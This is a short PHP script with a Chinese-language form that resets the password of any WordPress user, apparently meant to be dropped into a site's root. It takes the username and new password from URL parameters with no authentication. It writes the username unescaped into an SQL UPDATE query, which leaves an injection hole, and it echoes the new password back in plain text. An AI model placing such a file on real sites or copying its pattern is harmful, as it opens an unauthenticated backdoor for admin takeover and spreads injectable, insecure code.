<?php

if(isset($_GET['password'])) {

$username=trim($_GET['username']);

$password1=trim($_GET['password']);

 require_once(dirname(__FILE__).'/wp-load.php');

global $wp_hasher,$wpdb;

if(empty($wp_hasher)){

require_once( ABSPATH.'/wp-includes/class-phpass.php');

$wp_hasher = new PasswordHash(8, TRUE);

}

$password = $wp_hasher->HashPassword($password1);

$wpdb->query("UPDATE $wpdb->users SET user_pass='$password' WHERE user_login='$username'");

print "<br>已将管理员修改为 <font color=red>$username</font> ,密码改为 <font color=red>".$_GET[password]."</font>";    

 }

?>

<form >

<table>

 <tr><td>用户名：</td><td><input type="text" name="username">这里必须填写数据库中已存在的管理员帐号</td></tr>

 <tr><td>新密码：</td><td><input type="text" name="password"></td></tr>

 <tr><td colspan=2 align='center'><input type="submit" name="submit")> </td></tr>

</table>

</form>